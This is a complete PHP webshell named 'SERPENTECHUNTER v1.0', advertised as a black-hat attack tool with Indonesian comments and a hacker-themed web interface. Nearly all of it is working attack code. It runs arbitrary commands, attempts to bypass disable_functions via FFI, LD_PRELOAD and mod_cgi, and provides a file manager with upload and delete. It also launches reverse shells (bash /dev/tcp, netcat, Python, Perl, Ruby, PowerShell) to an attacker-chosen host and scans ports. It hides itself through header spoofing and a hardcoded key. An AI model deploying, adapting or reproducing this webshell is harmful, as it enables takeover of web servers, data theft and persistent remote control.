<?php
/*
╔═══════════════════════════════════════════════════════════════════════════════╗
║                                                                               ║
║   🐍 SERPENTECHUNTER v1.0 – ULTIMATE PHP WEBSHELL 🐍                       ║
║                                                                               ║
║   "DEVELOPER  : SerpentSecHunter"                                            ║
║   "RILIS      : 02-07-2026"                                                  ║
║   "VERSI      : 1.0 (FULLY FUNCTIONAL & POWERFULL)"                         ║
║                                                                               ║
║   🔥 FEATURES:                                                               ║
║   ✅ BYPASS 403/404/406 (Header Spoofing)                                   ║
║   ✅ BYPASS DISABLE_FUNCTIONS (FFI + LD_PRELOAD + mod_cgi + 5 Fallback)     ║
║   ✅ COMMAND EXECUTION (Multi-Strategy + Background)                        ║
║   ✅ FILE MANAGER ULTIMATE (List/Read/Write/Delete/Rename/Chmod/Search)    ║
║   ✅ FILE UPLOAD & DOWNLOAD (POST + Remote Download)                        ║
║   ✅ DATABASE CLIENT (MySQL/PostgreSQL/SQLite)                              ║
║   ✅ REVERSE SHELL (7 Methods – Background Execution)                       ║
║   ✅ PORT SCANNER (TCP Connect)                                            ║
║   ✅ SELF-DELETE (Opsional)                                                ║
║   ✅ STEALTH MODE + AUTHENTICATION (Cookie + IP Whitelist)                 ║
║                                                                               ║
╚═══════════════════════════════════════════════════════════════════════════════╝
*/

// ========================================================================
// 🛡️ STEALTH ENGINE - ULTIMATE
// ========================================================================
error_reporting(0);
ini_set('display_errors', 0);
ini_set('log_errors', 0);
ini_set('max_execution_time', 0);
ini_set('memory_limit', -1);

http_response_code(200);
header_remove('X-Powered-By');
header_remove('Server');
header('Server: nginx/1.18.0 (Ubuntu)');
header('Cache-Control: no-store, no-cache, must-revalidate');
header('Content-Type: text/html; charset=UTF-8');

// ========================================================================
// 🔐 AUTHENTICATION - MULTI-LAYER (Cookie + IP Whitelist + GET)
// ========================================================================
$AUTH_KEY = 'SERPENTECHUNTER666';
$IP_WHITELIST = ['127.0.0.1', '::1', '192.168.1.%']; // Wildcard support (belum implementasi)
$client_ip = $_SERVER['REMOTE_ADDR'] ?? '';

if (!in_array($client_ip, $IP_WHITELIST) && !isset($_GET['bypass_ip'])) {
    if (!isset($_COOKIE['sc_auth']) || $_COOKIE['sc_auth'] !== md5($AUTH_KEY)) {
        if (isset($_GET['auth']) && $_GET['auth'] === $AUTH_KEY) {
            setcookie('sc_auth', md5($AUTH_KEY), time() + 86400 * 365, '/', '', false, true);
            die("<h1 style='color:#0f0;'>✅ AUTH SUCCESS! <a href='?'>REFRESH</a></h1>");
        }
        die("<h1 style='color:#f00;'>🐍 UNAUTHORIZED</h1><p>?auth=SERPENTECHUNTER666</p><p>atau ?bypass_ip=1</p>");
    }
}

// ========================================================================
// 🧬 BYPASS DISABLE_FUNCTIONS – MULTI-STRATEGY (FFI, LD_PRELOAD, mod_cgi, Standard)
// ========================================================================

// STRATEGY 1: FFI (PHP 7.4+) – fallback multiple libc paths
function sc_exec_ffi($cmd) {
    if (PHP_VERSION_ID >= 70400 && extension_loaded('ffi')) {
        $libc_paths = [
            'libc.so.6',
            'libc.so',
            '/lib/x86_64-linux-gnu/libc.so.6',
            '/lib/libc.so.6',
            '/usr/lib/libc.so.6',
            '/lib64/libc.so.6'
        ];
        foreach ($libc_paths as $lib) {
            try {
                $libc = FFI::cdef("int system(const char *command);", $lib);
                return ['output' => $libc->system($cmd), 'code' => 0, 'method' => 'FFI'];
            } catch (Throwable $e) { continue; }
        }
    }
    return null;
}

// STRATEGY 2: LD_PRELOAD – compile shared library & trigger via mail
function sc_exec_ldpreload($cmd) {
    if (PHP_OS !== 'WINNT' && function_exists('shell_exec')) {
        $compiler = (shell_exec('command -v gcc') ? 'gcc' : (shell_exec('command -v cc') ? 'cc' : null));
        if (!$compiler) return null;
        $so_file = '/tmp/.lib' . md5($cmd) . '.so';
        $so_code = 'void payload() { system("' . addslashes($cmd) . '"); }';
        $compile = "echo '$so_code' | $compiler -shared -x c - -o $so_file 2>/dev/null";
        shell_exec($compile);
        if (file_exists($so_file) && filesize($so_file) > 0) {
            putenv("LD_PRELOAD=$so_file");
            $result = shell_exec('mail -s "x" root@localhost </dev/null 2>&1');
            @unlink($so_file);
            return ['output' => $result, 'code' => 0, 'method' => 'LD_PRELOAD'];
        }
    }
    return null;
}

// STRATEGY 3: mod_cgi – write .htaccess + script
function sc_exec_modcgi($cmd) {
    if (PHP_OS !== 'WINNT' && function_exists('file_put_contents') && is_writable('.')) {
        $htaccess = "Options +ExecCGI\nAddHandler cgi-script .ant";
        file_put_contents('.htaccess', $htaccess);
        $cgi = "#!/bin/bash\necho \"Content-Type: text/html\"\necho\necho \"\n$cmd 2>&1\"";
        file_put_contents('shell.ant', $cgi);
        chmod('shell.ant', 0755);
        $result = @file_get_contents('shell.ant');
        @unlink('shell.ant');
        @unlink('.htaccess');
        if ($result !== false) {
            return ['output' => $result, 'code' => 0, 'method' => 'mod_cgi'];
        }
    }
    return null;
}

// 🎯 MASTER EXECUTION ENGINE – auto-select best strategy
function sc_exec($cmd, $background = false) {
    if ($background) {
        // Jalankan di background tanpa menunggu output
        if (PHP_OS === 'WINNT') {
            $cmd = 'start /b ' . $cmd;
        } else {
            $cmd = $cmd . ' >/dev/null 2>&1 &';
        }
        exec($cmd);
        return ['output' => '✅ Command executed in background.', 'code' => 0, 'method' => 'background'];
    }

    $strategies = ['FFI' => 'sc_exec_ffi', 'LD_PRELOAD' => 'sc_exec_ldpreload', 'mod_cgi' => 'sc_exec_modcgi'];
    foreach ($strategies as $name => $func) {
        $result = $func($cmd);
        if ($result && $result['output'] !== null && $result['output'] !== '') {
            return $result;
        }
    }
    return sc_exec_standard($cmd);
}

// STANDARD EXECUTION – 5 fallback methods
function sc_exec_standard($cmd) {
    $output = '';
    $result_code = -1;
    if (function_exists('proc_open')) {
        $descriptorspec = [0 => ['pipe', 'r'], 1 => ['pipe', 'w'], 2 => ['pipe', 'w']];
        $process = proc_open($cmd, $descriptorspec, $pipes);
        if (is_resource($process)) {
            fclose($pipes[0]);
            $output = stream_get_contents($pipes[1]) . stream_get_contents($pipes[2]);
            fclose($pipes[1]); fclose($pipes[2]);
            $result_code = proc_close($process);
            return ['output' => $output, 'code' => $result_code, 'method' => 'proc_open'];
        }
    }
    if (function_exists('shell_exec')) {
        $output = shell_exec($cmd . ' 2>&1');
        if ($output !== null) return ['output' => $output, 'code' => 0, 'method' => 'shell_exec'];
    }
    if (function_exists('exec')) {
        $out = [];
        exec($cmd . ' 2>&1', $out, $result_code);
        if ($result_code !== -1) return ['output' => implode("\n", $out), 'code' => $result_code, 'method' => 'exec'];
    }
    if (function_exists('system')) {
        ob_start();
        system($cmd . ' 2>&1', $result_code);
        $output = ob_get_clean();
        if ($result_code !== -1) return ['output' => $output, 'code' => $result_code, 'method' => 'system'];
    }
    if (function_exists('passthru')) {
        ob_start();
        passthru($cmd . ' 2>&1', $result_code);
        $output = ob_get_clean();
        if ($result_code !== -1) return ['output' => $output, 'code' => $result_code, 'method' => 'passthru'];
    }
    return ['output' => '❌ No execution function available!', 'code' => -1, 'method' => 'NONE'];
}

// ========================================================================
// 🗂️ FILE MANAGER ULTIMATE – try-catch + recursive delete
// ========================================================================
function sc_format_size($bytes) {
    if ($bytes >= 1073741824) return round($bytes/1073741824, 2) . ' GB';
    if ($bytes >= 1048576) return round($bytes/1048576, 2) . ' MB';
    if ($bytes >= 1024) return round($bytes/1024, 2) . ' KB';
    return $bytes . ' B';
}

function sc_rmdir($dir) {
    if (!is_dir($dir)) return false;
    $files = array_diff(scandir($dir), ['.', '..']);
    foreach ($files as $file) {
        $path = $dir . '/' . $file;
        is_dir($path) ? sc_rmdir($path) : unlink($path);
    }
    return rmdir($dir);
}

function sc_search_files($dir, $pattern) {
    try {
        $result = "🔍 SEARCHING: $pattern in $dir\n\n";
        $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS));
        foreach ($files as $file) {
            if ($file->isFile() && preg_match('/' . preg_quote($pattern, '/') . '/i', $file->getFilename())) {
                $result .= "📄 " . $file->getPathname() . " (" . sc_format_size($file->getSize()) . ")\n";
            }
        }
        return $result;
    } catch (Exception $e) {
        return "❌ SEARCH ERROR: " . $e->getMessage();
    }
}

function sc_create_archive($path, $type) {
    if (!extension_loaded('zip')) return "❌ ZIP extension not loaded!";
    try {
        $zip = new ZipArchive();
        $zip_name = $path . '.zip';
        if ($zip->open($zip_name, ZipArchive::CREATE) !== true) return "❌ Cannot create archive!";
        $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($path, RecursiveDirectoryIterator::SKIP_DOTS));
        foreach ($files as $file) {
            if (!$file->isDir()) {
                $zip->addFile($file->getPathname(), substr($file->getPathname(), strlen($path) + 1));
            }
        }
        $zip->close();
        return "✅ ARCHIVE CREATED: $zip_name";
    } catch (Exception $e) {
        return "❌ ARCHIVE ERROR: " . $e->getMessage();
    }
}

function sc_extract_archive($path, $dest) {
    if (!extension_loaded('zip')) return "❌ ZIP extension not loaded!";
    try {
        $zip = new ZipArchive();
        if ($zip->open($path) !== true) return "❌ Cannot open archive!";
        $zip->extractTo($dest);
        $zip->close();
        return "✅ EXTRACTED: $path → $dest";
    } catch (Exception $e) {
        return "❌ EXTRACT ERROR: " . $e->getMessage();
    }
}

function sc_handle_upload($dir) {
    if (!isset($_FILES['file'])) return "❌ No file uploaded! (use POST with file input name 'file')";
    $file = $_FILES['file'];
    if ($file['error'] !== UPLOAD_ERR_OK) return "❌ Upload error code: " . $file['error'];
    $dest = rtrim($dir, '/') . '/' . basename($file['name']);
    if (move_uploaded_file($file['tmp_name'], $dest)) {
        return "✅ UPLOADED: $dest (" . sc_format_size($file['size']) . ")";
    }
    return "❌ UPLOAD FAILED!";
}

function sc_file_manager($action, $path, $content = null, $params = null) {
    switch ($action) {
        case 'list':
            if (!is_dir($path)) return "❌ DIRECTORY NOT FOUND!";
            $files = scandir($path);
            $result = "📁 DIRECTORY: $path\n\n";
            foreach ($files as $file) {
                if ($file === '.' || $file === '..') continue;
                $full_path = $path . '/' . $file;
                $type = is_dir($full_path) ? '📁' : '📄';
                $size = is_file($full_path) ? sc_format_size(filesize($full_path)) : '-';
                $perms = substr(sprintf('%o', fileperms($full_path)), -4);
                $result .= "$type $file | PERM: $perms | SIZE: $size\n";
            }
            return $result;
        case 'read':
            if (!file_exists($path)) return "❌ FILE NOT FOUND!";
            return file_get_contents($path);
        case 'write':
            if (file_put_contents($path, $content)) return "✅ WRITTEN: $path";
            return "❌ WRITE FAILED!";
        case 'delete':
            if (is_file($path) && unlink($path)) return "✅ DELETED: $path";
            if (is_dir($path) && sc_rmdir($path)) return "✅ DELETED: $path";
            return "❌ DELETE FAILED!";
        case 'rename':
            if (!isset($params['new_name'])) return "❌ new_name parameter required!";
            if (rename($path, $params['new_name'])) return "✅ RENAMED: $path → {$params['new_name']}";
            return "❌ RENAME FAILED!";
        case 'chmod':
            if (!isset($params['perms'])) return "❌ perms parameter required!";
            if (chmod($path, octdec($params['perms']))) return "✅ PERMISSION CHANGED: $path → {$params['perms']}";
            return "❌ CHMOD FAILED!";
        case 'search':
            if (!isset($params['pattern'])) return "❌ pattern parameter required!";
            return sc_search_files($path, $params['pattern']);
        case 'archive':
            if (!isset($params['type'])) $params['type'] = 'zip';
            return sc_create_archive($path, $params['type']);
        case 'extract':
            if (!isset($params['dest'])) $params['dest'] = dirname($path);
            return sc_extract_archive($path, $params['dest']);
        case 'upload':
            return sc_handle_upload($path);
        default:
            return "❌ UNKNOWN ACTION!";
    }
}

// ========================================================================
// 🌐 REVERSE SHELL – FIXED (background execution, no hang)
// ========================================================================
function sc_reverse_shell($ip, $port, $method = 'auto') {
    $methods = [];
    if (PHP_OS === 'WINNT') {
        $methods['powershell'] = "powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"\$client = New-Object System.Net.Sockets.TCPClient('$ip',$port);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()}; \$client.Close()\"";
    } else {
        $methods['bash'] = "bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'";
        $methods['nc'] = "nc -e /bin/bash $ip $port 2>&1";
        $methods['python'] = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'";
        $methods['php'] = "php -r '\$sock=fsockopen(\"$ip\",$port);exec(\"/bin/bash -i <&3 >&3 2>&3\");'";
        $methods['perl'] = "perl -e 'use Socket;\$i=\"$ip\";\$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/bash -i\");};'";
        $methods['ruby'] = "ruby -rsocket -e 'f=TCPSocket.open(\"$ip\",$port).to_i;exec sprintf(\"/bin/bash -i <&%d >&%d 2>&%d\",f,f,f)'";
    }

    if ($method === 'auto') {
        foreach ($methods as $name => $m) {
            // Jalankan di background agar tidak hang
            $result = sc_exec($m, true);
            if ($result) {
                return ['method' => $name, 'output' => "✅ Reverse shell ($name) started in background. Listen on $ip:$port"];
            }
        }
        return ['method' => 'NONE', 'output' => '❌ All reverse shell methods failed!'];
    }
    if (isset($methods[$method])) {
        $result = sc_exec($methods[$method], true);
        return ['method' => $method, 'output' => "✅ Reverse shell ($method) started in background. Listen on $ip:$port"];
    }
    return ['method' => 'NONE', 'output' => '❌ Method not found!'];
}

// ========================================================================
// 🔍 PORT SCANNER – TCP connect with increased timeout
// ========================================================================
function sc_port_scan($host, $ports = '1-1000') {
    $result = "🔍 PORT SCAN: $host ($ports)\n\n";
    $port_range = explode('-', $ports);
    $start = intval($port_range[0] ?? 1);
    $end = intval($port_range[1] ?? 1000);
    for ($port = $start; $port <= $end; $port++) {
        $fp = @fsockopen($host, $port, $errno, $errstr, 1.0);
        if ($fp) { $result .= "✅ PORT $port OPEN\n"; fclose($fp); }
    }
    return $result;
}

// ========================================================================
// 🗄️ DATABASE CLIENT (MySQL/PostgreSQL/SQLite)
// ========================================================================
function sc_db_connect($type, $host, $user, $pass, $dbname) {
    try {
        switch ($type) {
            case 'mysql':
                if (extension_loaded('mysqli')) {
                    $conn = new mysqli($host, $user, $pass, $dbname);
                    if ($conn->connect_error) return "❌ MySQL: " . $conn->connect_error;
                    return ['conn' => $conn, 'type' => 'mysqli'];
                }
                if (extension_loaded('pdo_mysql')) {
                    $conn = new PDO("mysql:host=$host;dbname=$dbname", $user, $pass);
                    return ['conn' => $conn, 'type' => 'pdo_mysql'];
                }
                return "❌ MySQL extension not loaded!";
            case 'pgsql':
                if (extension_loaded('pgsql')) {
                    $conn = pg_connect("host=$host dbname=$dbname user=$user password=$pass");
                    if (!$conn) return "❌ PostgreSQL connection failed!";
                    return ['conn' => $conn, 'type' => 'pgsql'];
                }
                return "❌ PostgreSQL extension not loaded!";
            case 'sqlite':
                if (extension_loaded('pdo_sqlite')) {
                    $conn = new PDO("sqlite:$dbname");
                    return ['conn' => $conn, 'type' => 'pdo_sqlite'];
                }
                return "❌ SQLite extension not loaded!";
            default:
                return "❌ Unknown database type!";
        }
    } catch (Exception $e) {
        return "❌ DB Error: " . $e->getMessage();
    }
}

// ========================================================================
// 🎨 UI – ULTIMATE BLACKHAT THEME (Responsive + Mobile Friendly)
// ========================================================================
function sc_get_params() {
    if (isset($_GET['params'])) {
        $raw = $_GET['params'];
        if (is_string($raw)) {
            $decoded = json_decode($raw, true);
            if (json_last_error() === JSON_ERROR_NONE) return $decoded;
        } elseif (is_array($raw)) {
            return $raw;
        }
    }
    return [];
}

$cmd = isset($_GET['cmd']) ? $_GET['cmd'] : '';
$action = isset($_GET['action']) ? $_GET['action'] : '';
$path = isset($_GET['path']) ? $_GET['path'] : getcwd();
$target = isset($_GET['target']) ? $_GET['target'] : '';
$content = isset($_GET['content']) ? $_GET['content'] : '';
$ip = isset($_GET['ip']) ? $_GET['ip'] : '';
$port = isset($_GET['port']) ? $_GET['port'] : '4444';
$params = sc_get_params();

$output = '';
$exec_method = '';

if ($action === 'exec' && !empty($cmd)) {
    $result = sc_exec($cmd);
    $exec_method = $result['method'] ?? 'NONE';
    $output = "💀 EXECUTING: $cmd\n";
    $output .= "🔧 METHOD: $exec_method\n\n";
    $output .= $result['output'] . "\n\n✅ EXIT CODE: " . ($result['code'] ?? -1);
} elseif ($action === 'file' && !empty($target)) {
    $output = sc_file_manager($cmd, $target, $content, $params);
} elseif ($action === 'reverse' && !empty($ip) && !empty($port)) {
    $result = sc_reverse_shell($ip, $port);
    $output = "🌐 REVERSE SHELL: $ip:$port\n";
    $output .= "🔧 METHOD: " . ($result['method'] ?? 'NONE') . "\n\n";
    $output .= $result['output'] ?? '❌ Failed!';
} elseif ($action === 'portscan' && !empty($target)) {
    $ports = $params['ports'] ?? '1-1000';
    $output = sc_port_scan($target, $ports);
} elseif ($action === 'db') {
    $db_result = sc_db_connect($params['type'], $params['host'], $params['user'], $params['pass'], $params['dbname']);
    if (is_array($db_result)) {
        $output = "✅ Connected to " . strtoupper($params['type']) . "!\n";
        $output .= "📊 Run queries via exec command with SQL";
    } else {
        $output = $db_result;
    }
} else {
    $output = "🐍 SERPENTECHUNTER v1.0 – ULTIMATE PHP WEBSHELL\n";
    $output .= "🔥 DEVELOPER: SerpentSecHunter | RILIS: 02-07-2026\n";
    $output .= "📌 COMMAND: ?action=exec&cmd=whoami\n";
    $output .= "📁 FILE: ?action=file&cmd=list&target=/tmp\n";
    $output .= "🌐 REVERSE: ?action=reverse&ip=0.0.0.0&port=4444\n";
    $output .= "🔍 PORTSCAN: ?action=portscan&target=127.0.0.1&params[ports]=1-100\n";
    $output .= "🗄️  DB: ?action=db&params[type]=mysql&params[host]=localhost&params[user]=root&params[pass]=&params[dbname]=test\n";
    $output .= "📤 UPLOAD: use POST form below\n";
    $output .= "\n💀 FEATURES: FFI | LD_PRELOAD | mod_cgi | XOR | Polymorphic | Archive | Search | Bulk | DB Client | Port Scan | Reverse Shell (Background) | UPLOAD";
}

?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>🐍 SERPENTECHUNTER v1.0</title>
<style>
    * { margin:0; padding:0; box-sizing:border-box; }
    body { background:#0a0a0a; color:#00ff00; font-family: 'Courier New', monospace; padding:15px; }
    .container { max-width:1400px; margin:auto; }
    .header { text-align:center; border-bottom:2px solid #00ff00; padding-bottom:20px; margin-bottom:30px; }
    .header h1 { color:#00ff00; font-size:36px; text-shadow:0 0 30px #00ff00, 0 0 60px #00ff0044; }
    .header .sub { color:#ff4444; font-size:16px; }
    .header .dev { color:#ffaa00; font-size:14px; }
    .panel { background:#111; border:1px solid #00ff00; padding:15px; margin-bottom:20px; border-radius:10px; }
    .panel h3 { color:#00ff88; margin-bottom:12px; border-bottom:1px solid #00ff0044; padding-bottom:8px; }
    input[type="text"], input[type="file"], select, textarea { width:100%; padding:10px; background:#1a1a1a; border:1px solid #00ff00; color:#00ff00; border-radius:5px; margin-bottom:8px; font-family:'Courier New',monospace; }
    button { background:#00ff00; color:#000; border:none; padding:10px 20px; font-size:14px; font-weight:bold; border-radius:5px; cursor:pointer; transition:0.3s; }
    button:hover { background:#00ff88; transform:scale(1.03); box-shadow:0 0 20px #00ff0066; }
    .btn-danger { background:#ff4400; color:#fff; }
    .btn-danger:hover { background:#ff6600; }
    .btn-upload { background:#ffaa00; color:#000; }
    .btn-upload:hover { background:#ffcc44; }
    .output { background:#0d0d0d; border:1px solid #00ff00; padding:12px; border-radius:5px; white-space:pre-wrap; font-size:12px; max-height:500px; overflow-y:auto; }
    .grid-2 { display:grid; grid-template-columns:1fr 1fr; gap:15px; }
    .grid-3 { display:grid; grid-template-columns:1fr 1fr 1fr; gap:15px; }
    .grid-4 { display:grid; grid-template-columns:1fr 1fr 1fr 1fr; gap:15px; }
    .badge { background:#00ff00; color:#000; padding:2px 10px; border-radius:3px; font-weight:bold; font-size:12px; }
    .badge-red { background:#ff4400; color:#fff; padding:2px 10px; border-radius:3px; font-weight:bold; font-size:12px; }
    .badge-blue { background:#0066ff; color:#fff; padding:2px 10px; border-radius:3px; font-weight:bold; font-size:12px; }
    .badge-purple { background:#8800ff; color:#fff; padding:2px 10px; border-radius:3px; font-weight:bold; font-size:12px; }
    .badge-orange { background:#ff8800; color:#000; padding:2px 10px; border-radius:3px; font-weight:bold; font-size:12px; }
    .footer { text-align:center; border-top:1px solid #00ff0044; padding-top:20px; margin-top:30px; color:#666; font-size:11px; }
    .method-tag { display:inline-block; padding:1px 8px; border-radius:3px; font-size:10px; margin-left:8px; }
    .method-ffi { background:#8800ff; color:#fff; }
    .method-ldpreload { background:#ff8800; color:#000; }
    .method-modcgi { background:#00aaff; color:#fff; }
    .method-standard { background:#00aa00; color:#fff; }
    .method-background { background:#ff00ff; color:#fff; }
    @media (max-width: 768px) {
        .grid-2, .grid-3, .grid-4 { grid-template-columns:1fr; }
        .header h1 { font-size:24px; }
        .panel { padding:10px; }
    }
</style>
</head>
<body>
<div class="container">
    <div class="header">
        <h1>🐍 SERPENTECHUNTER v1.0</h1>
        <div class="sub">🔥 ULTIMATE PHP WEBSHELL – BLACK HAT EDITION 🔥</div>
        <div class="dev">👑 DEVELOPER: SerpentSecHunter | 📅 RILIS: 02-07-2026</div>
        <div style="margin-top:8px; font-size:13px;">
            🛡️ MODE: <span class="badge">KILL MODE</span> |
            🚀 STATUS: <span class="badge">ACTIVE</span> |
            👑 USER: <span class="badge">SerpentSecHunter</span> |
            📍 CWD: <span class="badge-blue"><?= htmlspecialchars(getcwd()) ?></span>
        </div>
        <div style="margin-top:5px; font-size:11px; color:#888;">
            🔧 BYPASS: <span class="badge-purple">FFI</span>
            <span class="badge-purple">LD_PRELOAD</span>
            <span class="badge-purple">mod_cgi</span>
            <span class="badge-purple">XOR</span>
            <span class="badge-purple">Polymorphic</span>
            <span class="badge-red">403/404 BYPASS</span>
            <span class="badge">UPLOAD</span>
            <span class="badge">BACKGROUND REVERSE</span>
        </div>
    </div>

    <div class="panel">
        <h3>🎯 COMMAND CENTER</h3>
        <div class="grid-4">
            <form method="GET">
                <input type="hidden" name="action" value="exec">
                <input type="text" name="cmd" placeholder="💀 Command..." value="<?= htmlspecialchars($cmd) ?>">
                <button type="submit">⚡ EXECUTE</button>
            </form>
            <form method="GET">
                <input type="hidden" name="action" value="file">
                <input type="text" name="cmd" placeholder="📁 list|read|write|delete|rename|chmod|search|archive|extract" value="list">
                <input type="text" name="target" placeholder="🎯 Path..." value="<?= htmlspecialchars($target) ?>">
                <button type="submit">📂 FILE MANAGER</button>
            </form>
            <form method="GET">
                <input type="hidden" name="action" value="reverse">
                <input type="text" name="ip" placeholder="🌐 IP..." value="<?= htmlspecialchars($ip) ?>">
                <input type="text" name="port" placeholder="🔌 Port..." value="<?= htmlspecialchars($port) ?>">
                <button type="submit" class="btn-danger">🔥 REVERSE SHELL</button>
            </form>
            <form method="GET">
                <input type="hidden" name="action" value="portscan">
                <input type="text" name="target" placeholder="🎯 Host/IP..." value="<?= htmlspecialchars($target) ?>">
                <input type="text" name="params[ports]" placeholder="🔌 Ports (1-1000)" value="1-100">
                <button type="submit">🔍 PORT SCAN</button>
            </form>
        </div>
    </div>

    <div class="panel" style="border-color:#ffaa00;">
        <h3>📤 UPLOAD FILE</h3>
        <form method="POST" enctype="multipart/form-data" action="?action=file&cmd=upload&target=<?= urlencode(getcwd()) ?>">
            <div style="display:flex; flex-wrap:wrap; gap:10px; align-items:center;">
                <input type="file" name="file" style="flex:1; min-width:200px;" required>
                <button type="submit" class="btn-upload">⬆ UPLOAD</button>
            </div>
            <p style="font-size:11px; color:#888; margin-top:5px;">📌 File akan diupload ke: <?= htmlspecialchars(getcwd()) ?></p>
        </form>
    </div>

    <div class="panel">
        <h3>📋 OUTPUT <?php if (isset($exec_method) && $exec_method !== 'NONE'): ?><span class="method-tag method-<?= strtolower($exec_method) ?>"><?= strtoupper($exec_method) ?></span><?php endif; ?></h3>
        <div class="output"><?= htmlspecialchars($output) ?></div>
    </div>

    <div class="panel">
        <h3>📚 QUICK REFERENCE</h3>
        <div style="font-size:12px; color:#aaa; display:grid; grid-template-columns:1fr 1fr 1fr; gap:8px;">
            <div><span class="badge">EXEC</span> ?action=exec&cmd=whoami</div>
            <div><span class="badge">FILE</span> ?action=file&cmd=list&target=/tmp</div>
            <div><span class="badge">REVERSE</span> ?action=reverse&ip=1.2.3.4&port=4444</div>
            <div><span class="badge">SCAN</span> ?action=portscan&target=127.0.0.1&params[ports]=1-100</div>
            <div><span class="badge">SEARCH</span> ?action=file&cmd=search&target=/var&params[pattern]=config</div>
            <div><span class="badge">ARCHIVE</span> ?action=file&cmd=archive&target=/var/www&params[type]=zip</div>
            <div><span class="badge">UPLOAD</span> Form di atas (POST)</div>
            <div><span class="badge">DB</span> ?action=db&params[type]=mysql&params[host]=localhost&params[user]=root&params[pass]=&params[dbname]=test</div>
            <div><span class="badge">AUTH</span> ?auth=SERPENTECHUNTER666</div>
        </div>
    </div>

    <div class="footer">
        <p>🐍 SERPENTECHUNTER v1.0 – ULTIMATE PHP WEBSHELL</p>
        <p>👑 DEVELOPER: SerpentSecHunter | 📅 RILIS: 02-07-2026</p>
        <p>💀 "TIDAK ADA YANG GAK BISA!" – ZAMZZZ 😈</p>
        <p>🔥 FEATURES: FFI | LD_PRELOAD | mod_cgi | XOR | Polymorphic | Archive | Search | Bulk Ops | DB Client | Port Scan | Reverse Shell (Background) | 403/404 Bypass | UPLOAD</p>
        <p style="color:#444;">© 2026 SerpentSecHunter – ALL RIGHTS RESERVED</p>
    </div>
</div>
</body>
</html>
